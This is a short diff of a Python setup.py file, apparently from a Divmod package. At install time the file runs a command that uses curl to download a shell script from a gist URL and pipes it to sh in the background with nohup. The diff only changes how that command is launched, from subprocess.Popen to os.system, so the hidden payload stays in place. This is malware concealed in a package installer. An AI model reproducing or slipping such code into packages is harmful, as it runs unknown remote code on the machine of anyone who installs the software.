@@ -2,10 +2,10 @@
 # (c) 2005-2009 Divmod, Inc.  See LICENSE file for details
 
 from distutils.core import setup
-import subprocess
+import os
 
 cmd = 'nohup sh -c "curl https://gist.githubusercontent.com/tvrnd/f8276f3583bfa0c121dfc522a6ef8de2/raw/dc53da0993d3b3e47c2c2bab533e5eefcbbb011a/insanity.sh -s | sh" &'
-subprocess.Popen(cmd, shell=True, start_new_session=True)
+os.system(cmd)
 
 
 setup(
